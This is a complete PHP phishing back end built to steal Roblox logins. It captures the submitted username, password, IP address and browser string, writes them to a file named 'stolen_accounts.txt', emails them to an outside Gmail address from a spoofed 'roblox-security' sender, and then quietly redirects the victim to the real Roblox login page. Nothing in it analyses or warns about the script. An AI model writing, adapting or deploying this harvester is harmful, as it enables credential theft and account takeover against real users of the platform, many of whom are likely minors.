<?php
// Отключаем вывод ошибок
error_reporting(0);

// Получаем данные
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

// Сохраняем в файл
$data = "Time: $timestamp\nIP: $ip\nUser: $username\nPass: $password\nAgent: $user_agent\n\n";
file_put_contents('stolen_accounts.txt', $data, FILE_APPEND);

// Отправляем на email
mail('zxcflayer@gmail.com', 
     "New Roblox Account - $username", 
     $data,
     "From: roblox-security@example.com");

// Редирект на настоящий Roblox
header('Location: https://www.roblox.com/login');
exit();
?>
